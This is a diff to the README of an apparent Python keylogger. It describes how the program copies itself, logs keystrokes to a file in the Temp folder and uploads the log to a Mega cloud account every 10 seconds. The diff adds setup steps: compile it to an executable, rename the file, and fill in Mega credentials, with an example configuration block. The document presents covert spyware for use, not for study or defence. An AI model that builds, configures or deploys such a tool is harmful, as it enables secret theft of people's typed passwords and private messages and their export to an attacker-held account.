@@ -8,9 +8,17 @@ After starting, the keylogger copies the keylogger executable file (if it does n
 
 The keylogger saves pressed keys to a text file located in the `C:\Users\<username>\AppData\Local\Temp` folder. Every 10 seconds, the log file is sent to the Mega disk.
 
-The keylogger should be converted to an executable using `py-to-exe`.
-exe file should be renamed to variables file_name_to_find
-variables to configure
+## Configure the Variables
+
+Update the following variables in your configuration file:
+
+- **`file_name_to_find`**: Set this to the name of the executable file you created (e.g., `"NAME_OF_EXECUTABLE.exe"`).
+- **`email`**
+- **`password`**
+
+### Example Configuration
+
+```python
 file_name_to_find = "NAME_OF_EXECUTABLE.exe"
 email = 'YOUR_EMAIL'
 password = 'PASSWORD'
